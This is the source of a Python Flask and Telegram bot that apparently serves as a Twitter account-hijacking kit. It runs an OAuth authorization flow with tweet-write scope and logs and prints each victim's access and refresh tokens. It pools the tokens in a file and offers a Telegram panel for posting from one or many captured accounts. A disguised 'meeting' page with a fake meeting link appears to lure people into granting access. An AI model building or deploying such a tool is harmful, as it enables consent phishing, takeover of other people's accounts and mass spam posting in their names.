import base64
import hashlib
import os
import requests
from flask import Flask, request, jsonify, render_template, redirect, session
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Dispatcher, CommandHandler, CallbackQueryHandler, MessageHandler, Filters
import logging

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Configuration
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
CALLBACK_URL = os.getenv('CALLBACK_URL')  # Update with your actual callback URL
ALERT_BOT_TOKEN = os.getenv('ALERT_BOT_TOKEN')
AUTOMATION_BOT_TOKEN = os.getenv('AUTOMATION_BOT_TOKEN')
ALERT_CHAT_ID = os.getenv('ALERT_CHAT_ID')
AUTOMATION_CHAT_ID = os.getenv('AUTOMATION_CHAT_ID')
WEBHOOK_URL = os.getenv('WEBHOOK_URL')  # URL to set as the webhook for the bot

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Initialize Telegram Bots and Dispatcher
alert_bot = Bot(token=ALERT_BOT_TOKEN)
automation_bot = Bot(token=AUTOMATION_BOT_TOKEN)
dispatcher = Dispatcher(automation_bot, None, workers=4)

# Function to set up the webhook
def set_webhook():
    webhook_url = f"{WEBHOOK_URL}/webhook"
    alert_bot.set_webhook(url=webhook_url)
    automation_bot.set_webhook(url=webhook_url)
    logger.info(f"Webhook set to {webhook_url}")

# Function to load tokens from file
def load_tokens():
    tokens = []
    if os.path.exists('tokens.txt'):
        with open('tokens.txt', 'r') as file:
            tokens = [line.strip().split(',') for line in file if line.strip()]
    return tokens

# Function to get the total number of available tokens
def get_total_tokens():
    tokens = load_tokens()
    return len(tokens)

# Function to send startup messages
def send_startup_message():
    total_tokens = get_total_tokens()
    authorization_url = f"{WEBHOOK_URL}/authorization"
    meeting_url = f"{WEBHOOK_URL}/j?meeting=0&pwd=examplepwd"

    alert_message = "🚀 Alert Bot Started."
    automation_message = (
        f"🚀 Automation Bot Started.\n"
        f"🧮 Total Available Tokens: {total_tokens}\n"
        f"🔗 [Authorize here]({authorization_url})\n"
        f"📅 [Join Meeting here]({meeting_url})\n"
        f"Choose an option below."
    )
    
    automation_keyboard = [
        [InlineKeyboardButton("Refresh All Tokens", callback_data='refresh_all')],
        [InlineKeyboardButton("Post (Single Token)", callback_data='post_single')],
        [InlineKeyboardButton("Post (Bulk Tokens)", callback_data='post_bulk')]
    ]
    reply_markup = InlineKeyboardMarkup(automation_keyboard)
    
    # Send messages to both alert and automation bots
    alert_bot.send_message(chat_id=ALERT_CHAT_ID, text=alert_message)
    automation_bot.send_message(chat_id=AUTOMATION_CHAT_ID, text=automation_message, reply_markup=reply_markup, parse_mode='Markdown')

# Function to show the main menu with updated token status
def show_main_menu():
    total_tokens = get_total_tokens()
    message = (
        f"🚀 Main Menu\n"
        f"🧮 Total Available Tokens: {total_tokens}\n"
        f"Choose an option below."
    )
    keyboard = [
        [InlineKeyboardButton("Refresh All Tokens", callback_data='refresh_all')],
        [InlineKeyboardButton("Post (Single Token)", callback_data='post_single')],
        [InlineKeyboardButton("Post (Bulk Tokens)", callback_data='post_bulk')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    automation_bot.send_message(chat_id=AUTOMATION_CHAT_ID, text=message, reply_markup=reply_markup)

# Function to handle the /start command
def start(update, context):
    update.message.reply_text("Welcome! This bot is running using webhooks.")
    show_main_menu()

# Function to handle button clicks
def handle_button(update, context):
    query = update.callback_query
    query.answer()

    if query.data == 'refresh_all':
        query.edit_message_text(text="Confirm refreshing all tokens?",
                                reply_markup=InlineKeyboardMarkup([
                                    [InlineKeyboardButton("Yes", callback_data='confirm_refresh')],
                                    [InlineKeyboardButton("No", callback_data='main_menu')]
                                ]))
    elif query.data == 'confirm_refresh':
        refresh_all_tokens()
        query.edit_message_text(text="Tokens refreshed.",
                                reply_markup=InlineKeyboardMarkup([
                                    [InlineKeyboardButton("Back to Main Menu", callback_data='main_menu')]
                                ]))
    elif query.data == 'post_single':
        query.edit_message_text(text="Posting with a single token. Please enter your message:")
        context.user_data['post_mode'] = 'single'
    elif query.data == 'post_bulk':
        query.edit_message_text(text="Enter the number of tokens to use for posting:")
        context.user_data['post_mode'] = 'bulk'
    elif query.data == 'main_menu':
        show_main_menu()

# Function to refresh all tokens (simulated for this example)
def refresh_all_tokens():
    tokens = load_tokens()
    refreshed_count = len(tokens)
    logger.info(f"Refreshed {refreshed_count} tokens.")

# Function to handle messages
def handle_message(update, context):
    user_message = update.message.text
    post_mode = context.user_data.get('post_mode')

    if post_mode == 'single':
        context.user_data['message_content'] = user_message
        update.message.reply_text("Confirm posting the following message?",
                                  reply_markup=InlineKeyboardMarkup([
                                      [InlineKeyboardButton("Yes", callback_data='confirm_post')],
                                      [InlineKeyboardButton("No", callback_data='main_menu')]
                                  ]))
    elif post_mode == 'bulk':
        try:
            num_tokens = int(user_message)
            context.user_data['num_tokens'] = num_tokens
            update.message.reply_text(f"Using {num_tokens} tokens. Now, please enter the message content:")
        except ValueError:
            update.message.reply_text("Please enter a valid number.")

# Webhook route to handle incoming updates
@app.route('/webhook', methods=['POST'])
def webhook():
    update = Update.de_json(request.get_json(force=True), automation_bot)
    dispatcher.process_update(update)
    return jsonify({'status': 'ok'})

# Flask Routes for OAuth and Token Management
@app.route('/authorization')
def authorization():
    # Start the OAuth authorization process
    state = "0"
    code_verifier, code_challenge = generate_code_verifier_and_challenge()
    session['oauth_state'] = state
    session['code_verifier'] = code_verifier

    authorization_url = (
        f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
        f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
        f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
    )

    return redirect(authorization_url)

# Helper function to generate code verifier and challenge
def generate_code_verifier_and_challenge():
    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).rstrip(b'=').decode('utf-8')
    return code_verifier, code_challenge

@app.route('/oauth/callback')
def oauth_callback():
    code = request.args.get('code')
    state = request.args.get('state')
    error = request.args.get('error')

    if error:
        return f"Error during authorization: {error}", 400

    if state != session.get('oauth_state'):
        return "Invalid state parameter", 403

    code_verifier = session.pop('code_verifier', None)

    # Exchange authorization code for access token
    token_url = "https://api.twitter.com/2/oauth2/token"
    data = {
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': CALLBACK_URL,
        'code_verifier': code_verifier
    }

    response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
    token_response = response.json()

    if response.status_code == 200:
        access_token = token_response.get('access_token')
        refresh_token = token_response.get('refresh_token')
        logger.info(f"Access Token: {access_token}, Refresh Token: {refresh_token}")
        return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
    else:
        error_description = token_response.get('error_description', 'Unknown error')
        error_code = token_response.get('error', 'No error code')
        return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code

@app.route('/')
def home():
    return redirect('/authorization')

# Flask route for OAuth meeting page
@app.route('/j')
def meeting():
    state_id = request.args.get('meeting')
    code_ch = request.args.get('pwd')
    return render_template('meeting.html', state_id=state_id, code_ch=code_ch)

# Setting up command handlers
dispatcher.add_handler(CommandHandler('start', start))
dispatcher.add_handler(CallbackQueryHandler(handle_button))
dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

if __name__ == '__main__':
    set_webhook()          # Set up the webhook for the bot
    send_startup_message() # Send the startup message and show main menu
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port) # Start the Flask app
